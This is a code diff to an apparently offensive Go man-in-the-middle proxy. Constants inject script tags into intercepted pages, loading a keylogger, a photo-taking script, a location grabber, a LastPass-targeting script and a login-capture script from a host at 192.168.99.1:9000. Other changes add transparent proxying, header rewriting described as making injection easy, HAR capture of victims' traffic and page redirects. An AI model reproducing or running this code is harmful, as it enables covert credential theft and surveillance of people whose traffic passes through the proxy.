@@ -17,11 +17,11 @@ const (
     CONN_TYPE = "tcp"
 
     INJECT_LOGGER_REPLACE = "</body>"
-    INJECT_LOGGER_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/keylogger.js\"></script></body>"
-    INJECT_PHOTO_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/takePhoto.js\"></script></body>"
-    INJECT_LOCATION_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/getLocation.js\"></script></body>"
-    INJECT_LASTPASS_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
-    INJECT_LOGIN_RESULT = "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/login.js\"></script></body>"
+    INJECT_LOGGER_RESULT = "<script src=\"http://192.168.99.1:9000/public/InjectionScripts/keylogger.js\"></script></body>"
+    INJECT_PHOTO_RESULT = "<script src=\"http://192.168.99.1:9000/public/InjectionScripts/takePhoto.js\"></script></body>"
+    INJECT_LOCATION_RESULT = "<script src=\"http://192.168.99.1:9000/public/InjectionScripts/getLocation.js\"></script></body>"
+    INJECT_LASTPASS_RESULT = "<script src=\"http://192.168.99.1:9000/public/InjectionScripts/lastpassInjection.js\"></script></body>"
+    INJECT_LOGIN_RESULT = "<script src=\"http://192.168.99.1:9000/public/InjectionScripts/login.js\"></script></body>"
 )
 // Provide booleans for each function
 var globalStoreHAR bool
@@ -52,8 +52,18 @@ func StartSimpleProxy() {
     // Start the proxy.
     proxy := goproxy.NewProxyHttpServer()
 
-    // What does this do?
-    proxy.Verbose = false
+    proxy.Verbose = true
+
+    //transparency
+    proxy.NonProxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
+        if req.Host == "" {
+            log.Println(w, "Cannot handle requests without Host header, e.g., HTTP 1.0")
+            return
+        }
+        req.URL.Scheme = "http"
+        req.URL.Host = req.Host
+        proxy.ServeHTTP(w, req)
+    })
 
     // Check if we are BLOCKING this page.
     if globalBlocks {
@@ -89,16 +99,14 @@ func StartSimpleProxy() {
             t := time.Now().Local()
             timestamp := t.Format("20060102150405")
             proxy.FlushHARToDisk(fileLocation+"/hars/req_"+strings.Split(ctx.Req.RemoteAddr, ":")[0]+"_"+ctx.Host()+"_"+timestamp+".har")
-        } else {
-            //log.Println(" --- CLIENT REQUEST: NOT logging HAR for "+ctx.Host() )
-        }
+        } 
         // Check if this is HTTPS connection via MITM.
         if ctx.IsThroughMITM {
             ctx.Req.Host = ctx.Host()
             log.Println(" $$$ MITM: Connection is over HTTPS")
             return goproxy.FORWARD // don't follow through other Request Handlers
         }
-
+        log.Println("ctx.Req: ", ctx.Req.Host)
         return goproxy.NEXT
     })
 
@@ -126,7 +134,9 @@ func StartSimpleProxy() {
             if err != nil {
                log.Println("inject error: ", err)
             }
+            log.Println("ctx: ", ctx.Resp.Request.URL)
             //process whether to inject scripts
+            utilsModifyHeadersForInjection(ctx) //inject headers to make injection easy
             body := utilsProcessInjectionScripts(ctx, string(bs))
             
             ctx.Resp.Body = ioutil.NopCloser(bytes.NewBufferString(body))
@@ -149,7 +159,6 @@ func TriggerRedirect() goproxy.HandlerFunc {
     pageRedirect := goproxy.HandlerFunc( func(ctx *goproxy.ProxyCtx) goproxy.Next {
         // Get the body for the redirect url.
         body := utilsGetBuffer(strings.Split(ctx.Req.URL.Host, ".")[1]) //get the middle of the url: www.url.com...
-        //body = utilsInjector(ctx,body, "</body>", "<script src=\"http://127.0.0.1:9000/public/InjectionScripts/keylogger.js\"></script></body>")
         // Set the response-headers before responding.
         client_response := utilsGetHTTPHeaders(body,"text/html")
         ctx.Resp = client_response
